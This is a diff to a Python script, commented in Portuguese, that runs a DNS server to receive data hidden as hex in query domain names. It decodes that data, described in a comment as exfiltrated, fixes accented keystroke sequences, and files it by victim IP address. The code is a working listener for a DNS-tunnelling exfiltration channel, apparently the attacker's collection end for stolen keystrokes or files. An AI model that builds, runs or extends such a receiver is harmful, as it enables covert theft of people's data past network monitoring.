@@ -4,7 +4,7 @@
 import socket
 from dnslib import DNSRecord, QTYPE, RR, A
 import time
-import os
+import os.path
 
 ###############################################################
 # Vars. Global
@@ -19,11 +19,10 @@ _COR = {
         'yellow':'\033[33m'
     }
 _CONT = 0
+
 ###############################################################
 # Classes e Funções
 ###############################################################
-def Enter_txt(data):
-    return
 def treatments(data):
     replacements = {
         '´a': 'á',
@@ -51,12 +50,19 @@ def treatments(data):
 
     return data
 
-def write_on_file(path, data):
-    #data = treatments(data)
-    #print (data)
-    with open(path, 'a') as file:
-        file.write(data)
-        file.close()
+def write_on_file(path, arc_name, data):
+    
+    path_name = os.path.join(path, arc_name)
+
+    if os.path.isdir(path):
+        with open(path_name, 'a') as file:
+            file.write(data)
+            file.close()
+    else:
+        os.mkdir(path)
+        with open(path_name, 'a') as file:
+            file.write(data)
+            file.close()
 
 def menu(addr=None, data=None):
     global _LAST_REQUEST
@@ -90,6 +96,11 @@ def start_dns_server():
     # Cria um socket para ouvir requisições DNS
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(_DNS_ADDR)
+
+    if os.path.isdir('logs'):
+        pass
+    else:
+        os.mkdir('logs')
     
     menu()
     
@@ -98,8 +109,8 @@ def start_dns_server():
             data, addr = sock.recvfrom(512)
             _CONT += 1
 
-            # Formando o path para cada cliente
-            path = str(addr[0]) + '.txt'
+            # Formando o path/pasta para cada cliente
+            path = os.path.join('logs', str(addr[0]))
             
             # Lê a requisição DNS
             request = DNSRecord.parse(data)
@@ -108,14 +119,18 @@ def start_dns_server():
             
             # Decodifica os dados do domínio
             data = ''.join([chr(int(data[i:i+2], 16)) for i in range(0, len(data), 2)])
-            #print(f"Dados exfiltrados: {str(data)}")
+            
+            # Daqui pra baixo passar para uma thread futuramente
+            arc_name, data = (data[:3] + '.txt'), data[3:]
+
             if _CONT == 2:
                 data = treatments(data) + '\n'
                 _CONT = 0
             else:
                 data = treatments(data)
+
             menu(addr, data)
-            write_on_file(path, data)            
+            write_on_file(path, arc_name, data)            
             
             # Criando um objeto DNSRecord para a resposta
             dns_response = DNSRecord()
